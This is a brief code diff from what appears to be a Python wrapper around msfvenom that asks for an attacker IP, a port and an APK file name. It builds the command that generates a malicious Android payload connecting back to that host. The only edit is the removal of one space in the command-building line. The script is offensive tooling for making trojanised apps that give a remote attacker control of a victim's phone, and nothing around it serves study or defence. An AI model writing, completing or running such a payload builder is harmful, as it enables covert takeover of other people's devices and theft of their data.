@@ -12,7 +12,7 @@ lhost = input("Enter your ip address - ",)
 lport = input("Enter your port number - ",)
 print("Type apk name with '.apk' extension.")
 apk_name = input("Enter apk name - ",)
-msfvenom_sentence = "msfvenom -p "+ Android_payload+ " lhost"+"="+lhost+ " lport"+ "="+ lport+" R> "+apk_name
+msfvenom_sentence = "msfvenom -p "+Android_payload+ " lhost"+"="+lhost+ " lport"+ "="+ lport+" R> "+apk_name
 
 def payload():
     if Android_payload == "first":
